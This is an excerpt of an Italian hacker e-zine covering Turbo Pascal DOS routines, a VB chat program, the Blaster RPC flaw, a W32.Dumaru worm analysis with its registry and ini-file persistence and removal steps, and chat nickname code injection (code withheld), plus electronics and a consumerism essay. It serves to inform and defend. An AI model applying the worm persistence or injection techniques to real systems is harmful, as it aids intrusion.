 |ftime:=0;                                                                   |
 |UnpackTime(ftime,fpacked);                                                  |
 |{qui "unpacka" fpacked dentro ftime, quindi ftime Φ di nuovo pieno}         |
 |writeln(ftime);                                                             |
 |{ora unpackiamolo di nuovo perchΘ ftime Φ salvato nel modo del computer...} |
 |UnpackTime(ftime,fpacked);                                                  |
 |writeln(ftime);                                                             |
 |end.                                                                        |
 +----------------------------------------------------------------------------+
 ...
 |Quando Φ spenta (FALSE) il dos controlla il Ctrl+C solo durante il flusso di|
 |Input-Output su console o su stampante                                      |
 |Quando Φ accesa (TRUE) i controlli sono fatti su qualsiasi chiamata del     |
 |sistema                                                                     |
 |                                                                            |
 |PROCEDURE SETDATE;                                                          |
 |procedure SetDate(Year, Month, Day: Word);                                  |
 |dal nome inglese si pu≥ benissimo capire che questo comando imposta la data |
 |N.B(issimo).                                                                |
 |sono validi solo i seguenti parametri                                       |
 |Anni: da 1980-2099, Mesi da 1-12 e Giorni da 0-31                           |
 |se i parametri sono invalidi la chiamata a SetDate verrα ignorata           |
 |                                                                            |
 |PROCEDURE SETFATTR;                                                         |
 |procedure SetFAttr(var F; Attr: Word);                                      |
 |imposta gli attributi un file (nascosto, archivio, sola lettura...)         |
 |dove F Φ un file assegnato ma non aperto, mentre Attr Φ l'attributo che gli |
 ...
 |5 - Access Denied (Φ inglish, ma Φ pi∙ figo!)                               |
 |                                                                            |
 ...
 |pu≥ essere solamente il 6 (Manipolazione File Invalida o non riuscita)      |
 |Sono validi solo i seguenti parametri                                       |
 |Ore: da 0-23, Minuti da 0-59, Secondi da 0-59, CentSec da 0-99              |
 |se i parametri sono invalidi la chiamata a SetFTime verrα ignorata          |
 |                                                                            |
 |PROCEDURE SETTIME;                                                          |
 |procedure SetTime(var Hour, Minute, Second, Sec100: Word);                  |
 |anche qui si pu≥ benissimo capire che questa procedura imposta l'ora        |
 |N.B.                                                                        |
 ...
 |P.S. (Pre Scrittum)                                                         |
 |Questa funzione Φ utilissima se volete crackare...                          |
 |Purtroppo non esistono anche impostazioni sugli altri flags... me speis     |
 |N.S. (Normal Scrittum)                                                      |
 |Imposta lo stato del flag Verify nel dos, quando Φ spento (FALSE), le       |
 |operazioni su disco non sono verificate, quando Φ accesa (TRUE) il contrario|
 |                                                                            |
 ...
 |begin                                                                       |
 |GetVerify(v);                                                               |
 |writeln('il verify flag Φ ',OffOn[v]);                                      |
 |v:=not(v);                                                                  |
 ...
 |procedure SwapVectors;                                                      |
 |Φ troppo complicato da spiegarlo... ci metterei qualche anno solo per       |
...
......ò.............
........ò.òò.............
....òòòòòòòò...òòòòòòòò...............   Crearsi una MultiChat  ........
....ò.òòòòòò.òòòòò......................................................
..òòòòòòòòòòòòòòòò............          Lord Unrelated Lodeguns ........
òòòòòòòò.òòòòòòòòòò.....................................................
...
.Disclaimer
 ...
 che ho trovato e ci ho messo un p≥ di variabili  una  analisi  completa
 racchiusa in una lista albero e altre cosette simili... quindi l'autore
 del multisock che vedrα le sue righe in questa chat si ricordi  che  le
 ha disposte a dominio pubblico e del resto controllando un libro che ho
 di vb ho notato che  anche  li erano riportate, perci≥ voglio solo dire
 che non ho  rimorsi  di  coscienza  avendo  non  codato  per intero  un
 software in VB.

.Intro
 Come si pu≥ evincere dal disclaimer oggi come oggi... dopo che Lord_Jex
 se ne Φ andato anche io ho un p≥ di confusione in testa...  quello  che
 mi rode di + Φ il fatto che un programmatore, un hacker e persone della
 ...
 cos∞ incazzato che se per caso Naomi Campbell volesse  scopare  con  me 
 ...
 non cambier≥ mai sempre tentando di migliorare e non guardando indietro
 , rilassato, aiuter≥ gli altri e poi me stesso.. come Caio Lucillio  in
 ...
 questione Φ molto semplice...  come  qualsiesi   chat Φ composta da  un 
 client e da un server. Il client per funzionare ha bisogno  dell'ip del
 server...

 Qui  di  seguito  Φ  inutile  riportarvi  tutto il codice che del resto
 ...
 negli  allegati...   quindi  solo  i  newbies  si  troveranno   un   p≥
 ...
 un pezzo  di  codice per il quale ne vado fiero...   anche perchΦ ci ho
...
----------------------------------------------------------------------
 ...
 solo gli ultimi 3...  ma  il  fatto  Φ che al posto del 123 ci stavano
 ...
 risolvere...
 ed  ho  buttato  gi∙ ste 4 righe scolandomi una busta di latte e cacao.
 Il  bello  Φ  kmq che  un problema simile non era riportato in nessuno 
 ...
 vi  lascio  alla  multichat di InformazioneLibera che Φ presente negli
 allegati...  BUON divertimeto e lasciatemi logorare in pace tra i miei
 mille pensieri di un mondo che va a sfacelo.

 Antonella un giorno riuscir≥ a dirti quello che provo per te e  magari
 cyber mi darα una mano...:)
 non so quando, non so dove, nΦ il perchΦ, nΦ il come ma
 sono sicuro che non ti lascer≥ scappare un'altra  volta,
 mi sono proprio rotto di vivere attaccato alla tastiera senza pensare
 un p≥ di pi∙ alla vita reale, che ho l'obbligo come tutti di renderla
 un p≥ + vivibile... (Leggetivi nella  Zine  3  il trattato filosofico
 sul kosmos capirete un p≥ di +, come la penso... se vi interessa....)
......òòò.òòòòòòòòòòòòòòò................
.......òòò.òòò.ò...òò.òòò.............
.......òòòòòòòòòòò.òò.............
..........òòòòòòòòòòòò.ò...............
...
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
Se ami il calcio il calcio ama teà  cosa  vi  ricorda  questa  sigla ?  Beh  mi 
...
a studiarci  bene  questa  nuova  realtα  e  vogliamo rendere  note  le  nostre 
conoscenze, direi di fare  un  bel applauso a  Unrelated,  Tailot  e  Mystic  e 
andare a leggere l'articolo OpenSky Resolution tra gli allegatià buona  lettura 
a tutti 
...
la  sessione.  Tutte  le modifiche non salvate andranno  perse.  Il  processo  Φ
iniziato   da  NT  Authority  System.  Riavvio  fra  [40...39...38...]  secondi.
Messaggio:  E' necessario riavviare Windows poichΘ il servizio Remote  Procedure
Call Φ terminato in maniera imprevista
********************************************************************************
...
tutto  chi  pu≥  essere la vittima: possessori di Win NT 4.0 server  e  terminal
...
Il  nome  del virus Φ Blaster o MSBlaster, il computer che ne Φ infetto ha  come
...
quasi  un  mese  e poi installarla, la patch Φ di circa un mega  dipendente  dal
sistema  operativo, Questa patch si preoccupa solo di togliere la  vulnerabilitα
dal  servizio  di RPC (Remote Procedure Call). Da questo indirizzo  Φ  possibile
...
-Intro
-Il Servizio RPC
-La vulenerabilitα nei sistemi microsoft...
-Il worm
-conclusioni

*Intro
Classificato  da  casa  microsoft  come "critical"  il  livello  di  rischio  di
W32.Blaster,  colpisce  sistemi windows dove Φ attivo il  servizio  RPC  (Remote
...
Nei  sistemi  windows  il  protocollo Φ derivato  dal  RPC  OSF  (Open  Software
Foundation), ma con l'aggiunta di alcune estensioni specifiche di Microsoft(Cos∞
dice microsoft...).


*La Vulnerabilitα nei sistemi microsoft...
C'Θ una vulnerabilitα nella parte dell'RPC che tratta con lo scambio di messaggi
tramite  TCP/IP. La falla esiste perchΘ c'Θ una gestione incorretta dei messaggi
malformati.  Distributed  Component Object Model  (DCOM)  con  l'RPC,  il  quale
ascolta  sulle  porte  abilitate, sono affetti da questa  vulnerabilitα.  Questa
...
vulnerabilitα  l'attacker  deve mandare un pacchetto "speciale"  alla  specifica
...
firewall  queste  porte sono accessibili e se il sistema non  Φ  aggiornato  con
l'opportuna patch, l'attacker Φ in grado di sfuttare la vulnerabilitα.
...
di  entrare nel sistema. Il corrente exploits per la vulnerabilitα discussa  nel
...
tranquilli?  A cosa Φ servita la politica "closed source" del big di  redmond???
...
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
Hey people, da quanto tempo che non ci sentivamoà dunque quest'oggi parliamo un 
po' di security. Di cosa voglio parlarvi oggi? Dunque  voglio  parlarvi  di  un 
virus cos∞ idiota ma cos∞ idiota che neanche l'antivirus lo riconosce come tale 
questo Φ una merdaccia di virus appartenente alla specie dei worms (vermi).Cosa 
posso dirvi su  questo  virus ?  Ecco  à  prima  cosa  il  nome,  W32.Dumaru@mm 
Analizziamo cosa fa questo virus à come si comporta, voi  andate  nella  vostra 
...
In pratica vi pregano di istallare la "patch" per prevenire virus à e invece??? 
Ecco qui, il virus Φ nascosto in patch.exe, voi ciccate  sopra  e  innescate il 
...
%Windir% Φ una variabile il virus localizza  la  cartella  di  istallazione  di 
windows (c:\windows) e si  copia  li  dentro à  %System% a nche  questa  Φ  una 
...
%Windir%\winload.log,il primo Φ un trojan IRC che alla successiva connessione a 
...
fatto ci≥, aggiunge il valore "load32" = "%Windir%\load32.exe" nel registro  di 
sistema all'indirizzo 

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 

cos∞ quando poi andiamo a riavviare windows modifica la sezione di win.ini file 
run=%Windir%\dllreg.exe  e   il  boot  di  system.ini  file  shell=explorer.exe 
%System%\vxdmgr32.exe à questi ultimi due passaggi sono  validi per i  seguenti 
sistemi operativi Windows 95/98/Me.

Dunque per risolvere tale problema la prima cosa da fare Φ: 
...
à adesso usciti dal regedit andiamo su:  

start û esegui -  edit c:\windows\win.ini 

si aprirα una finestra dos dove ci sarα una stringa tipo 
...
a questo punto file û save  û file û exit à 
...
file û save û file û exit 
Abbiamo eliminato sto stupido virusà  visto? Vi avevo detto  che era  una  cosa 
...
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
Ciao ragazzi, ai giorni d'oggi siamo in  un  modo dove  l'incapacitα  di alcuni 
programmatori e la poca etica della gente calpestata da tutta la feccia che c'Φ 
in giro rendono questo navigare in  rete  una  cosa  pericolosaà oggi giorno un 
qualunque individuo che sta in rete pu≥  ritrovarsi  il  pc ripulito  da capo a 
fondo senza capire neanche cosa gli sta succedendo!! Ma  in che  mondo viviamo? 
Pi∙ che un articolo di sicurezza definirei  il  mio  un  articolo  che serva ad 
aprirvi gli occhi sulla realtα della rete. D unque per  spiegare  meglio il mio 
concetto vi riporto il pi∙ banale degli esempi: le  chat à  penso  che chiunque 
...
rappresenta uno dei maggiori luoghi dove Φ  possibile  rimanere fregatià adesso 
voi direte ma che stai dicendo? Io mica vado su chat  stupide? Io vado  su chat 
professioniste!! Beh vi dico subito che la storia non cambia!!PerchΘ? Ora ve lo 
spiego à se entrando in chat vedete che  il sito  finisce  con .asp  allora  vi 
...
un username (nome utente) à ebbene Φ qui la falla, basta che un malintenzionato 
qualunque al posto del nick inserisca un codice asp maligno (che non  allegher≥ 
...
quel canaleà chiaro? Sapete che addirittura anche Yahoo ha un  bug del  genere? 
Non so  se  avete mai  utilizzato  Yahoo!  Messenger  5.0,  questo  Φ anch'esso 
vulnerabile a differenza della versione Yahoo!Messenger 5.0 .1065 in cui invece 
questo bug Φ stato correttoà qui invece basta conoscere un po' di  Javascript o 
...
andare il testo che leggeranno tutti à questo codice sarα ripetuto  in tutto il 
canale, immaginate se la stringa di codice  inserito  comanda  l'apertura delle 
porte al vostro sistema o qualcosa di peggio  ancoraà  consegnereste  il vostro 
sistema al lamerozzo che sfrutta tale sistema!! ╚ vero con questo articolo sono 
andato a spiegare a qualche malintenzionato come  fare per  creare scompigli in 
rete, ma almeno ho spiegato anche a voi perchΘ non conviene stare in chat senza 
le dovute precauzionià tanto il pirata prima o poi il modo l'avrebbe trovato lo 
stessoà dopotutto basta cercare!!!  Almeno adesso anche voi  siete  allerta.Ora 
...
articoli  (il  pi∙  reglari  possibili) sull'elettronica...Preavviso.......  NON
intendo   annoiarvi   con   mega   formule  matematiche,   user≥   solo   quelle
fondamentali....  Non  sapendo  da  dove  cominciare,  allora...  l'elettronica,
attualmente Φ un po dappertutto... non si puo spiegare come funziona  un  micro,
un  cell o una tv senza sapere le basi, per cui.... Elettronica... la piu grande
distinzione di sistemi elettronici Φ tra analogici e digitali... allora...

ANALOGICO: definizione: Si dice analogico un segnale che varia tra un  minimo  e
un massimo con continuitα....  CHE SIGNIFICA?????  Per darvi un'idea, la voce  Φ
analogica.... posso usare qulasiasi volume ( entro certi limiti :P) e  qualunque
tonalitα  (idem),  altra  cosa di analogica... la vista...  l'udito...  insomma,
...
forse  Φ  piu facile capirlo facendo dei confronti... Io, guardando un panorama,
vedo un'infinitα di colori, di sfumature etc.... Scatto una foto, la importo  al
...
Altra   distinzione  per  l'elettronica  Φ  quella  ELETTRONICA  di  SEGNALE   e
...
Φ  quella che di solito comanda dei motori, casse, luci e chi pi∙ ne ha  pi∙  ne
metta....  La  distinzione  tra  segnale e potenza  Φ  abbastanza  variabile  in
funzione  del circuito... ci≥ che da il comando Φ il segnale, l'attuatore  Φ  la
...
sappiate cos'e....  La potenza Φ "energia". In campo elettrico ed elettronico  Φ
definito come W=V*I ovvero Potenza=Tensione*Corrente.....

Come unitα di misura:
...
Girando  la formula la corrente che deve scorrere nel cavo affinchΦ la lampadina
si  accenda  e  sviluppi i suoi 60W Φ di I=60/220 = 0.27A  (  ATTENZIONE  !!!!!!
...
piedini  (  tipo  ragnetti ).Cosa sono ???? Sono integrati... Il  loro  scopo  Φ
...
tramite somme......Magico, vero????  Detto questo....  Non saprei pi∙ cosa  dire
...
o quasi funziona in digitale, che Φ molto  meglio del vecchio
ed antiquato analogico".
Sarα davvero vera questa citazione?
Io non credo che l'analogico sia tanto male. Ancora molte co-
se funzionano in analogico. Pi∙ di quel che pensereste. A co-
...
la radio che  Φ sempre analogica, concludendo con  la normale
...
trebbero usare  un cavo  bifase anzichΦ trifase  dovendo tra-
...
modo indipendente  siano 10... bhe in questo caso ansicchΦ u-
sare un bordello di cavi, si userebbe un cavo bifase e si ri-
solverebbero  molti problemi. Questo Φ il vantaggio del digi-
tale; tuttavia credo che alcune case costruttrici di elettro-
domestici e di "industrie civili" (non saprei come chiamarle)
non abbiano compreso appieno ci≥, e si sbizzarriscano a crea-
re roba  digitale a pi∙ non posso. Questa roba, oltre che es-
sere spesso inutile, Φ progettata anche male perchΦ  deve co-
...
babilmente perchΦ i tecnici credevano che la trasmissione dei
dati in modo  digitale sia migliore... si certo, Φ vero, ma x
una radio di merda di pochi centimetri cosa vuoi che cambi??
Voglio quindi concludere...
Questo Φ l'era del digitale, l'era dell'ottimismo (pubblicitα
occulta ]:-P ), l'era in cui tutto ci≥ che Φ digitale Φ otti-
mo; ci≥ che Φ analogico viene visto con sguardo maligno, qua-
si fosse roba da quattro soldi. Vorrei vedere i dj scratchare
al computer o con  una piastra a cd. Questa Φ  solo una delle
cose che non  Φ possibile fare con il digitale. In questo pe-
riodo stiamo  esagerando un p≥ troppo. Molte  cose potrebbero
essere  pi∙ semplici, se solo venissero  progettate con un p≥
di cervello in pi∙.
...
+--[FILOSOFIA HACK]------------------------------------------------------[IL04]+
|  Titolo: Societα consumistica,cos'Φ e a cosa ci sta portando                 |
|  Autore: Bigalex                                                             |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
----==[Societα consumistica, cos'Φ  e a cosa ci sta portando]==----

Benvenuti nell'era del consumismo. Ormai la societα  di oggi Φ com-
pletamente legata  al consumismo. Tuttavia c'Φ chi  non sa cos'Φ e-
sattamente il  consumismo. PerchΦ diciamo di  vivere in una societα
consumistica?
Il concetto di consumismo Φ stato  brillantemente ideato dagli ame-
...
troppi. Dopo si rompe . E per noi Φ  normale: quando si rompe se ne
compra un'altra, anche perchΦ riparare una semplice radio costa or-
mai pi∙ che comprarne una nuova e magari  col led che ci avverte se
la batteria Φ scarica. Allora noi diremo: "Waaaa! E' un affare! C'Φ
persino il led!!!". E che dire  dei cellulari? Sono ormai costretto
a cambiare un cellulare all'anno perchΦ ogni volta si rompe qualco-
sa che costa oltre i 100 euro, e con 100 euro mi compro un cellula-
re nuovo. Roba da pazzi. Questo Φ il consumismo. Si Φ capito che se
una cosa dura troppo, il mercato si satura e se tutti hanno giα una
...
126 o le 500 e le nuove macchine. Non si capisce bene perchΦ, ma le
...
sto modo non si saturerα mai, essendoci un continuo rinnovo. E' co-
me se il commercio fosse diventato una societα: c'Φ chi muore e chi
...
polifoniche, siamo delle merde. Siamo inferiori. Se lo zaino Φ vec-
...
serve davvero ad  un cazzo (non che il resto  abbia un'utilitα), ma
...
Questo Φ il consumismo. Ci convincono, in modo particolare con tv e
radio, ad acquistare di tutto. E l'apice  di tutto ci≥ si manifesta
con le continue pubblicitα del cazzo che ti permettono con il modi-
co prezzo di 1 euro di ricevere la tua suoneria preferita o il logo
di eminem. Ormai queste pubblicitα sono ovunque. L'altro giorno ero
...
rare il denaro. Peccato che il denaro che abbiamo Φ poco e non pos-
...
non ti fa pensare  ad altro. Questa societα non ci sta bene. Tutta-
via una  soluzione c'Φ. Comprare  solo  ci≥ di cui si  ha bisogno e
preferire marche italiane. Far crollare i mercati stranieri. Sebbe-
ne ci≥  porterα al crollo di  tutti i mercati, che  sono fortemente
collegati tra loro, questo Φ l'unico modo per far si che questa so-
cietα crolli intaccando il meno possibile il mercato italiano.
...
| solo riportate qui per rendervi la vita pi∙ facile!! Buona lettura           |
+------------------------------------------------------------------------------+
|  +--[INDICE NEWS]------------------------------------------------------------+
|     +.....................................................................+  |
...
risultavano  chiamate  effettuate dal suo locale verso il  Pakistan,  lÆIndia  e
lÆArabia Saudita, per un ammontare di circa 5 mila dollari.
...
l'intento  dellÆaccusato  non  era  quello  di  danneggiare  l'azienda  per  cui
...
sondaggio  fosse addirittura bloccata dal troppo traffico), per cui Φ  probabile
...
| libera!!! Chi Φ interessato a  collaborare  pu≥  inviare  i  suoi  articoli  |
